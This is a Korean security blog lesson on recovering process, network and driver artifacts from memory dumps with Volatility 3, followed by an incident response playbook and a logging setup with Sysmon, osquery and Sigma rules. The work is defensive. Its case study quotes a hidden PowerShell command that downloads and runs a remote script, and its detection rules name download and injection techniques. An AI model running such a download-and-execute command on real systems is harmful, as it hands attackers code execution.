---
layout: post
title: 시스템보안 - 실습(Volatility로 프로세스/네트워크/드라이버 아티팩트 복원)
date: 2025-10-26 22:30:23 +0900
category: 시스템보안
---
# 11.3 실습: Volatility로 프로세스/네트워크/드라이버 아티팩트 복원

## 11.3.1 준비 — 덤프 취득과 증거 보전(Checklist)

**Windows (권장: WinPmem/Raw)**
```powershell
# 도구 해시로 검증
Get-FileHash .\winpmem.exe -Algorithm SHA256

# RAW 메모리 덤프 (외장 저장소 권장)
.\winpmem.exe --format raw --output E:\evidence\WS-001_2025-11-01.raw

# 해시 산출(보전)
Get-FileHash E:\evidence\WS-001_2025-11-01.raw -Algorithm SHA256 |
  Out-File E:\evidence\WS-001_2025-11-01.raw.sha256.txt
```

**Linux (권장: AVML)**
```bash
sudo avml /mnt/usb/LIN-01_2025-11-01.lime
sha256sum /mnt/usb/LIN-01_2025-11-01.lime > /mnt/usb/LIN-01_2025-11-01.lime.sha256
```

**CoC(Chain of Custody) 필수 필드**
- 증거 ID / 취득자 / 시간(KST) / 장소 / 대상 자산 / 도구·버전 / 해시  
- 저장·인계 로그(누가 언제 어디로 이동·보관했는지)

---

## 11.3.2 Volatility 3 빠른 길라잡이 (Windows 중심)

> 표준 명령 패턴: `vol -f <dump> <plugin> [옵션]`  
> 심볼 자동 다운로드가 어려우면 `--offline` 대신 심볼 캐시 준비.

### A) 프로세스 복원(실행 트리·명령줄·환경)

```bash
# 핵심 인덱스
vol -f WS-001.raw windows.info
vol -f WS-001.raw windows.pslist
vol -f WS-001.raw windows.pstree

# 명령줄/환경
vol -f WS-001.raw windows.cmdline  | head -n 30
vol -f WS-001.raw windows.environ  --pid <PID> | head -n 50

# 의심 프로세스 휴리스틱(예: 부모-자식 이상/위치 불일치)
vol -f WS-001.raw windows.psscan | grep -i "powershell\|wscript\|rundll32\|mshta"
```

**분석 포인트**
- 부모/자식 불일치(`winword.exe → powershell.exe` 등)  
- 사용자 세션 시간대 vs 업무 시간대  
- 경로 위장(`C:\Users\Public\` 하위 실행) / 서명 부재

### B) 이미지·모듈·주입 흔적

```bash
# 프로세스 모듈 목록(로드 타임·경로·InMemory)
vol -f WS-001.raw windows.dlllist --pid <PID> | head -n 60

# 메모리 내 의심 영역(코드 인젝션/Reflective Load 후보), 덤프까지
vol -f WS-001.raw windows.malfind --pid <PID> --dump
# 덤프 산출물은 ./dump/ 하위 → 해시/AV/YARA로 정적 스캔
```

**YARA (기본 IOC 예)**  
```yar
rule Suspicious_PowerShell_EncodedCommand {
  strings:
    $s1 = "EncodedCommand" nocase
    $s2 = "FromBase64String" nocase
  condition:
    2 of ($s*)
}
```

### C) 핸들·토큰·권한

```bash
# 프로세스 핸들(파일/Mutant/Key/Section) — 잠금/은닉 힌트
vol -f WS-001.raw windows.handles --pid <PID> | head -n 80

# SID/토큰/권한(권한 상승 흔적)
vol -f WS-001.raw windows.getsids --pid <PID> | head -n 40
```

### D) 네트워크 아티팩트 (세션·포트·DNS)

```bash
# TCP/UDP (지원 OS/빌드에 따라 플러그인 가용성 상이)
vol -f WS-001.raw windows.netstat

# 소켓 소유 프로세스 상관
vol -f WS-001.raw windows.netscan | grep -i ESTAB | head -n 30
```

**해석 포인트**
- CLI(명령줄) 시점 vs 연결 시점 상관(타임라인)  
- egress(외부) IP/호스트의 희귀도 / 지리 / ASN (추후 위협 인텔 상관)

### E) 드라이버·커널(루트킷 탐지의 “관측” 단계)

```bash
# 로드된 드라이버/이미지
vol -f WS-001.raw windows.driverscan | head -n 40
vol -f WS-001.raw windows.driverirp | head -n 60

# SSDT/콜백(지원 빌드): 커널 후킹 관측(변경 금지, '유무' 확인용)
vol -f WS-001.raw windows.ssdt | head -n 30
vol -f WS-001.raw windows.devicetree | head -n 50
```

**탐지 포인트**
- 서명 부재/희귀 공급자  
- 비표준 장치 경로(`\Device\*\EduDrv` 등)  
- IRP MajorFunction 가로채기 흔적(분석 메모)

---

## 11.3.3 Linux 메모리(개요)

```bash
# pslist/psscan 유사
vol -f LIN-01_2025-11-01.lime linux.pslist
vol -f LIN-01_2025-11-01.lime linux.netstat
vol -f LIN-01_2025-11-01.lime linux.lsmod
vol -f LIN-01_2025-11-01.lime linux.bash | head -n 40
```

**Linux 해석 포인트**
- 커널 모듈(lsmod) 희귀 항목 / tainted 플래그  
- SSH 활동(journalctl/secure) vs 메모리 소켓 상관  
- `.bash_history`/메모리 명령열 상호 검증

---

## 11.3.4 미니 케이스 — “다운로드 실행 의심” 복원 시나리오

**상황**  
- 17:43 KST: `powershell.exe` 통한 외부 443 연결 경보  
- 덤프 시각: 17:48 KST

**절차 요약**
```bash
# 실행 트리
vol -f WS-001.raw windows.pstree | grep -i powershell -n

# 명령줄
vol -f WS-001.raw windows.cmdline | grep -i powershell

# 네트워크
vol -f WS-001.raw windows.netstat | grep -i powershell

# 주입/스캔
vol -f WS-001.raw windows.malfind --pid <PS_PID> --dump
# 덤프 파일 해시 → 위협 인텔/YARA 스캔
```

**결론 기록(예)**
- 17:42:58 `powershell -nop -w hidden -c iwr https://hxxp[.]ex/k.ps1 | iex`  
- 17:43:01 1회성 TLS 연결 후 추가 자식 프로세스 無 (차단 추정)  
- `malfind` 양성 없음 / `dlllist` 정상 / 네트워크 세션 종료

---

# 11.4 플레이북: 분류·격리·제거·복구·사후 보고

## 11.4.1 분류(Classification)

**초기 티어링**
- **Critical**: 랜섬 암호화 진행 / DA 토큰 탈취 징후 / 대규모 exfil  
- **High**: C2 비콘 확인 / 내부 수평 이동 의심  
- **Medium**: 다운로드·실행 시도 / 단일 호스트 의심  
- **Low**: 오탐 가능성 높은 경고(정상 도구 과탐)

**분류 기준(예)**
- 영향 자산(Tier-0/1/2), 데이터 민감도(PII/지재), 시간대(업무·야간)

---

## 11.4.2 격리(Containment)

**기술 조치 예**
- 네트워크 분리(EDR 네트워크 격리, NAC VLAN 이동)  
- C2 도메인/IP 차단(프록시/방화벽/EDR)  
- 해당 사용자 계정 잠금·회전, 세션 무효화

**의사결정 매트릭스**
| 조건 | 조치 |
|---|---|
| 암호화 진행 중 | 즉시 격리, 스냅샷 후 오프라인 |
| 비콘만 탐지, 업무 영향 우려 | 우선 룰 차단, 미러링 캡처, 제한적 격리 |
| 내부 스캐닝·Lateral Movement | 세그먼트 레벨 ACL 강화, 위험 호스트 우선 격리 |

---

## 11.4.3 제거(Eradication)

- 악성 서비스/계정/스케줄러/런키 제거  
- 지속성(Persistence) 제거: Run/RunOnce/Services/Task/WMIC/IFEO/AppInit_DLLs 등  
- 레지스트리/파일 흔적 정리(증거 보전 사본 확보 후)

**Windows 스크립트 예(관찰 위주)**
```powershell
# 런키/서비스/스케줄 태그 점검(삭제는 Change Control 승인 후)
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
Get-Service | Where-Object {$_.StartType -eq 'Automatic' -and -not $_.DisplayName -like '*Microsoft*'} |
  Select Name,DisplayName,Status,PathName
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} |
  Select TaskName,TaskPath,State
```

---

## 11.4.4 복구(Recovery)

- 패치/구성(ASR/WDAC/LSA PPL/HVCI/LDAP·SMB 서명) 반영  
- 자격 회전(gMSA·LAPS·Secrets), API 키·토큰 재발급  
- 백업 복원(무결성 검증: 해시·샘플 부팅)  
- 모니터링 강화(탐지 룰 “감사→강제” 전환)

---

## 11.4.5 사후 보고(Post-Incident Report)

**골격**
1) 사건 개요(탐지→대응→종결 타임라인)  
2) 유입 경로(가설·근거) / 수평 이동 여부 / 유출 증거  
3) 조치(격리/제거/복구)와 잔여 리스크  
4) 재발 방지(정책·구조·교육) + 마감일/오너  
5) 증거 목록·해시·CoC 첨부

**간단 템플릿**
```
[Executive Summary]
- 2025-11-01 17:43 KST PowerShell 다운로드 실행 탐지
- 격리: 17:48, 제거 완료: 18:30, 복구: 19:10
- 유출 증거 없음(네트워크/타임라인/메모리 상관)

[Root Cause Hypothesis]
- 이메일 URL 클릭 가능성(SEC-GW 로그 추가 확인)

[Improvements]
- ASR 정책 확장(PSExec/Office child process 차단)
- PowerShell Constrained Language Mode 확대
- Proxy URL Category 룰 강화 (Due: 2025-11-15 / Owner: SecOps)
```

---

# 11.5 방어: 수집 정책(Sysmon/OSQuery), 중앙집중 로깅, 보존 주기

## 11.5.1 수집 정책 — Sysmon (Windows)

> 원칙: **가시성 극대화 + 오탐 억제**. “허용 리스트 → 감사 → 강제” 순.

**핵심 이벤트**
- 1(ProcessCreate), 3(NetworkConnect), 7(ImageLoad), 10(ProcessAccess),  
  11(FileCreate), 12~14(Registry), 22(DNS), 23-24(FileDelete/Clipboard 옵션), 25-26(ProcessTampering 등)

**스니펫(개념)**
```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>

    <!-- 프로세스 생성: 주요 LOLBin, PowerShell 상세 -->
    <ProcessCreate onmatch="include">
      <Image condition="end with">powershell.exe</Image>
      <CommandLine condition="contains">EncodedCommand</CommandLine>
      <Image condition="end with">mshta.exe</Image>
      <Image condition="end with">rundll32.exe</Image>
      <Image condition="end with">regsvr32.exe</Image>
    </ProcessCreate>

    <!-- 네트워크: 외부 egress (내부 제외 CIDR) -->
    <NetworkConnect onmatch="exclude">
      <DestinationIp condition="is">10.0.0.0/8</DestinationIp>
      <DestinationIp condition="is">172.16.0.0/12</DestinationIp>
      <DestinationIp condition="is">192.168.0.0/16</DestinationIp>
    </NetworkConnect>

    <!-- 모듈 로드: amsi/ntdll/보안 모듈 무서명 로드 경보 -->
    <ImageLoad onmatch="include">
      <ImageLoaded condition="end with">amsi.dll</ImageLoaded>
      <ImageLoaded condition="end with">ntdll.dll</ImageLoaded>
      <Signature condition="is">Unsigned</Signature>
    </ImageLoad>

    <!-- 레지스트리: Run/IFEO/Policies -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">\Run</TargetObject>
      <TargetObject condition="contains">\Image File Execution Options\</TargetObject>
      <TargetObject condition="contains">\Policies\System\</TargetObject>
    </RegistryEvent>

  </EventFiltering>
</Sysmon>
```

**운영 팁**
- 2단계 필터: 에이전트 측(잡음 제거) + SIEM 측(상관·희귀도)  
- 하위 OU(개발/랩)는 룰 강도 차등

---

## 11.5.2 수집 정책 — osquery (Windows/Linux/macOS)

**핵심 테이블/쿼리**
- `processes`, `process_open_files`, `listening_ports`, `hash`, `drivers`, `kernel_extensions`  
- `scheduled_tasks`(win), `crontab`(lin), `launchd`(mac)  
- `user_ssh_keys`, `authorized_keys`(lin), `chrome_extensions`

**패키지 예(간단 Pack)**
```json
{
  "packs": {
    "ir_core": {
      "queries": {
        "proc_rare": {
          "query": "SELECT name, path, cmdline, uid, gid, start_time FROM processes WHERE parent <> 0;",
          "interval": 600
        },
        "listening": {
          "query": "SELECT * FROM listening_ports WHERE address NOT IN ('127.0.0.1','::1');",
          "interval": 300
        },
        "drivers_win": {
          "query": "SELECT * FROM drivers;",
          "interval": 1800,
          "platform": "windows"
        },
        "crontab_lin": {
          "query": "SELECT * FROM crontab;",
          "interval": 1800,
          "platform": "linux"
        }
      }
    }
  }
}
```

**운영 포인트**
- 서버·워크스테이션 **별도 Pack**  
- 결과는 **TLS/HTTPS 로깅**으로 중앙 수집(인증서 관리)

---

## 11.5.3 중앙집중 로깅 아키텍처

**구성 요소**
- **Forwarder/Agent**: Winlogbeat/Fluent/Osquery/EDR  
- **메시지 버스**: Kafka(옵션)  
- **스토리지/검색**: Elastic/Splunk/Sentinel/ClickHouse  
- **장기보관**: S3·Object Storage(수명 주기 정책), Glacier 아카이브

**파이프라인**
1) 엔드포인트 → Forwarder에서 **필수 채널만 송신**  
2) 중간 버퍼(옵션) → 급증 시 손실 방지  
3) SIEM 인덱싱 → **파서/정규화**(ECS/CEF)  
4) 장기 보관(압축·파티션·수명주기)

**KQL/ES 예 — 고빈도 이벤트 요약 대시보드**
```kusto
SecurityEvent
| where TimeGenerated > ago(24h)
| summarize cnt=count() by EventID
| order by cnt desc
```

---

## 11.5.4 보존 주기(레텐션) & 법·비용 균형

**권장 범위(예시, 조직·규정 따라 조정)**
- **핵심 보안 이벤트**: 180~365일 온라인 (빠른 검색)  
- **풀 로그(압축)**: 1~3년 오브젝트 스토리지(법/감사 준거)  
- **pcap/메모리/디스크 이미지**: 사건 단위로 **증거 보존 정책**(해시·암호화)

**수명주기 정책 예(S3)**
- 30일: 표준 → 90일: Infrequent Access → 1년: Glacier Deep Archive

**무결성**
- WORM/버저닝(삭제·변조 방지)  
- 해시 매니페스트(월별) + 주기 검증(샘플 1%)

---

## 11.5.5 탐지 룰 번들(샘플)

**Sigma — PowerShell 다운로드 실행**
```yaml
title: PowerShell Web Download and Execute
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4688
    NewProcessName|endswith: '\powershell.exe'
    CommandLine|contains:
      - 'Invoke-WebRequest'
      - 'curl '
      - 'iwr '
      - 'FromBase64String'
  condition: selection
level: medium
```

**Sigma — Sysmon 주입 체인**
```yaml
title: Process Injection via WinAPI
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    CallTrace|contains:
      - 'WriteProcessMemory'
      - 'VirtualAllocEx'
      - 'CreateRemoteThread'
  condition: selection
level: high
```

---

## 11.5.6 운영 점검표

**수집/전송**
- [ ] Sysmon 채널 손실률 < 0.5%  
- [ ] osquery TLS 오류율 < 1% / 재시도 백오프 설정  
- [ ] WEF/WinRM 구독 정상 여부(헬스 비트)

**보관/검색**
- [ ] 인덱스 파티션/ILM(수명주기) 정책 적용  
- [ ] 비용 모니터(GB/일) & 카드inality 높은 필드 최소화

**탐지/대응**
- [ ] 상위 10 룰 오탐율(분기) 추적, 허용 리스트 갱신  
- [ ] 플레이북 RTO/RPO 만족(테이블탑 연 2회)

---

# 부록: “끝에서 끝까지” 미니 랩 흐름 요약 (실무형)

1) **수집**: WinPmem RAW + KAPE triage + osquery pack 수집  
2) **메모리 분석**: Volatility — `pslist/pstree/cmdline/netstat/malfind/dlllist`  
3) **네트워크**: Zeek/TShark — dns/http/ssl 타임라인  
4) **타임라인**: Plaso → CSV → (선택) Timesketch 주석  
5) **상관**: KQL/Sigma 룰 테스트(감사 모드)  
6) **대응**: 격리→제거→복구 / 자격 회전 / 정책(ASR/WDAC/HVCI/LSA) 상향  
7) **보고**: 요약·근거·개선안·마감일 / 증거 해시·CoC 첨부

---

# 마무리

- **Volatility**는 “실행 맥락 복원”의 중심축입니다(프로세스·네트워크·드라이버).  
- **플레이북**은 “누가·언제·무엇을”을 자동화 가능 수준으로 구체화해야 **RTO**를 단축합니다.  
- **수집 정책(Sysmon/osquery) + 중앙 로깅 + 적절한 보존 주기**는 “탐지→분석→보고”의 시간을 **시간 단위**로 줄여줍니다.  
- 모든 구성은 **감사 모드 → 강제 모드** 단계적 전환, **허용 리스트 선(先) 구축**이 핵심입니다.